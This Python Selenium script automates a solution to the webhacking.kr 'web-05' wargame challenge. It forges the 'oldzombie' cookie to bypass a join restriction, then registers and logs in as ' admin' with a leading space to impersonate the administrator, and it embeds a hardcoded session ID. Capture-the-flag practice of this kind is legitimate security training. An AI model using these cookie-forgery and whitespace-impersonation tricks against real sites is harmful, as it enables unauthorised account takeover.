from selenium import webdriver
from time import sleep

def getflag(cookie=None):
    options = webdriver.ChromeOptions()
    options.add_experimental_option("excludeSwitches", ["enable-logging"])
    driver = webdriver.Chrome(executable_path='chromedriver', options=options)


    url = 'https://webhacking.kr/challenge/web-05'
    cookie1 = {'name':'oldzombie', 'value':'-1'}
    driver.get(url=url)
    driver.delete_all_cookies()
    driver.add_cookie(cookie)
    driver.add_cookie(cookie1)
    
    driver.get(url=url+'/mem/join.php?mode=1')
    driver.find_element_by_xpath('/html/body/center/form/table/tbody/tr[1]/td[2]/input').send_keys(' admin')
    driver.find_element_by_xpath('/html/body/center/form/table/tbody/tr[2]/td[2]/input').send_keys('123')
    driver.find_element_by_xpath('/html/body/center/form/table/tbody/tr[3]/td/input').click()

    driver.get(url=url+'/mem/login.php')
    driver.find_element_by_xpath('/html/body/center/form/input[1]').send_keys(' admin')
    driver.find_element_by_xpath('/html/body/center/form/input[2]').send_keys('123')
    driver.find_element_by_xpath('/html/body/center/form/p/input').click()

    try:
        al = driver.switch_to_alert()
        if 'already solved' in al.text:
            print('#05 PASS ')
        al.accept()
    except:
        print("ERROR NO.05")
    driver.close()

if __name__ == '__main__':
    coo = {'name':'PHPSESSID', 'value':'e8j3vm6uvuh4fqlgml274or3ek'}
    getflag(coo)